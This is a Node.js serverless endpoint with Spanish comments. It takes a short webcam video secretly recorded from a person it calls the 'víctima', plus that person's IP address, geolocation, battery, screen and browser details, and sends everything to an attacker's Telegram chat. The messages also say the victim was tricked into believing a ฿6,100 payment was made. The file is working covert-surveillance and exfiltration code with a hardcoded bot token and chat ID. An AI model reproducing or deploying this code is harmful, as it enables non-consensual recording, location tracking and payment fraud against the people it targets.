const formidable = require('formidable');
const fs = require('fs');

// Función para enviar video a Telegram usando multipart/form-data manual
async function sendVideoToTelegram(videoBuffer, message, ip) {
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7532643566:AAF7Qyz0jYP0ck20RJdFyZNe1L9fETFU-IM';
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '12075234';
  
  console.log('=== TELEGRAM DEBUG ===');
  console.log('Token:', TELEGRAM_BOT_TOKEN ? 'Configurado' : 'No configurado');
  console.log('Chat ID:', TELEGRAM_CHAT_ID);
  console.log('Video size:', videoBuffer.length, 'bytes');
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('ERROR: Telegram no configurado');
    return false;
  }

  try {
    console.log('1. Enviando mensaje de texto...');
    
    // Primero enviar el mensaje de texto
    const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const messageResult = await messageResponse.json();
    console.log('Mensaje resultado:', messageResult);

    if (messageResponse.ok) {
      console.log('✅ Mensaje de texto enviado correctamente');
    } else {
      console.log('❌ Error enviando mensaje:', messageResult);
    }

    console.log('2. Enviando video...');
    
    // Crear multipart/form-data manualmente para el video
    const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substr(2);
    const videoFileName = `video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm`;
    
    // Construir el cuerpo multipart
    let body = '';
    
    // Chat ID
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
    body += `${TELEGRAM_CHAT_ID}\r\n`;
    
    // Caption
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
    body += `🎥 Video de la víctima capturado (5 segundos)\r\n`;
    
    // Video file
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="video"; filename="${videoFileName}"\r\n`;
    body += `Content-Type: video/webm\r\n\r\n`;
    
    // Crear el buffer final
    const preBuffer = Buffer.from(body, 'utf8');
    const postBuffer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
    const finalBuffer = Buffer.concat([preBuffer, videoBuffer, postBuffer]);
    
    console.log('Tamaño del buffer final:', finalBuffer.length, 'bytes');
    
    const videoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': finalBuffer.length.toString()
      },
      body: finalBuffer
    });

    const videoResult = await videoResponse.json();
    console.log('Video resultado:', videoResult);

    if (videoResponse.ok) {
      console.log('✅ Video enviado a Telegram exitosamente');
      return true;
    } else {
      console.log('❌ Error enviando video:', videoResult);
      return false;
    }
  } catch (error) {
    console.error('❌ Error crítico enviando a Telegram:', error);
    return false;
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Obtener IP del usuario
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress ||
               'unknown';
               
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });

    // Parsear el video usando formidable
    const form = formidable({
      maxFileSize: 50 * 1024 * 1024, // 50MB max
      keepExtensions: true
    });

    const [fields, files] = await form.parse(req);
    
    if (!files.video || !files.video[0]) {
      return res.status(400).json({ status: 'error', message: 'No video file received' });
    }

    const videoFile = files.video[0];
    const videoBuffer = require('fs').readFileSync(videoFile.filepath);
    const fileSize = (videoFile.size / 1024 / 1024).toFixed(2); // MB

    // Información del dispositivo si está disponible
    let deviceInfo = {};
    if (fields.deviceInfo && fields.deviceInfo[0]) {
      try {
        deviceInfo = JSON.parse(fields.deviceInfo[0]);
      } catch (e) {
        console.log('Error parsing device info');
      }
    }

    // Analizar User Agent para detalles
    let deviceType = 'Unknown';
    let os = 'Unknown';
    let browser = 'Unknown';

    if (userAgent.includes('Mobile') || userAgent.includes('Android')) deviceType = '📱 Móvil';
    else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) deviceType = '📱 Tablet';
    else deviceType = '💻 Desktop';

    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'macOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iOS')) os = 'iOS';

    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';

    // Crear información detallada del dispositivo
    let deviceDetails = '';
    if (deviceInfo.screenWidth) {
      deviceDetails += `📱 <b>Pantalla:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
    }
    if (deviceInfo.timezone) {
      deviceDetails += `🌍 <b>Zona horaria:</b> ${deviceInfo.timezone}\n`;
    }
    if (deviceInfo.language) {
      deviceDetails += `🗣️ <b>Idioma:</b> ${deviceInfo.language}\n`;
    }
    if (deviceInfo.geolocation && deviceInfo.geolocation !== 'No disponible') {
      deviceDetails += `📍 <b>Ubicación:</b> ${deviceInfo.geolocation.latitude}, ${deviceInfo.geolocation.longitude}\n`;
    }
    if (deviceInfo.memory && deviceInfo.memory !== 'N/A') {
      deviceDetails += `💾 <b>RAM:</b> ${deviceInfo.memory}GB\n`;
    }
    if (deviceInfo.cores && deviceInfo.cores !== 'N/A') {
      deviceDetails += `⚡ <b>CPU Cores:</b> ${deviceInfo.cores}\n`;
    }
    if (deviceInfo.battery && deviceInfo.battery !== 'No disponible') {
      deviceDetails += `🔋 <b>Batería:</b> ${JSON.stringify(deviceInfo.battery)}\n`;
    }

    // Crear mensaje completo para Telegram
    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b> (5 segundos)

📍 <b>IP VÍCTIMA:</b> <code>${ip}</code>
🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm</code>
📊 <b>Tamaño:</b> ${fileSize} MB
⏰ <b>Hora:</b> ${timestamp}

${deviceType} <b>Dispositivo:</b> ${os}
🌐 <b>Navegador:</b> ${browser}

${deviceDetails}

📱 <b>User Agent:</b>
<code>${userAgent}</code>

🎭 <b>¡BROMA EXITOSA!</b>
💰 <b>Víctima creyó que pagaste:</b> ฿6,100.00
🎬 <b>Video adjunto abajo ⬇️</b>`;

    // Enviar a Telegram
    const telegramSent = await sendVideoToTelegram(videoBuffer, message, ip);

    // Log detallado
    console.log(`[${timestamp}] VIDEO_UPLOADED from ${ip} - Size: ${fileSize}MB - Duration: 5 seconds - Telegram: ${telegramSent ? 'SENT' : 'FAILED'}`);

    res.json({ 
      status: 'success', 
      message: telegramSent ? 'Video de 5 segundos enviado a Telegram correctamente' : 'Video procesado pero Telegram falló',
      filename: `video_${Date.now()}_${ip}.webm`,
      telegramSent: telegramSent,
      debug: {
        videoSize: fileSize + 'MB',
        ip: ip,
        timestamp: timestamp
      }
    });

  } catch (error) {
    console.error('Error processing video:', error);
    res.status(500).json({ status: 'error', message: 'Error processing video' });
  }
}; 